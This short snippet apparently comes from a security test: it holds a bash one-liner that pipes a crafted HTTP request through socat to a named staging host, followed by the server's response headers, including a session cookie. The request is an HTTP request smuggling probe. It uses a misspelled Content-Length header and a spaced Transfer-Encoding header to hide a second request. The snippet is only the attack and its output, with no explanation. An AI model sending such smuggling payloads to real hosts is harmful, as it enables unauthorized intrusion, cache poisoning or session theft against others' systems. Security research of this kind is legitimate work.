```bash
cat <(printf "HEAD /static/pin_32.png HTTP/1.1\r\nHost: airflow-staging.data.coda.io\r\nContent-Lenght: 6\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET /postshit HTTP/1.1\r\nHost: airflow-staging.data.coda.io") - | socat - SSL:airflow-staging.data.coda.io:443
```

```yaml
HTTP/1.1 200 OK
Cache-Control: public, max-age=43200
Content-Disposition: inline; filename=pin_32.png
Content-Length: 1201
Content-Type: image/png
Date: Sat, 13 Jul 2024 01:35:32 GMT
ETag: "1718660154.0-1201-230237892"
Expires: Sat, 13 Jul 2024 13:35:32 GMT
Last-Modified: Mon, 17 Jun 2024 21:35:54 GMT
Server: gunicorn
Set-Cookie: session=53e99cd4-a30b-4f7f-956e-c17ff28ca68c.6ZMbZOu1zi0r__36D3LoCjSd9eg; Expires=Sun, 14 Jul 2024 01:35:32 GMT; HttpOnly; Path=/; SameSite=Lax
X-Frame-Options: DENY
X-Robots-Tag: noindex, nofollow
Connection: Close
```
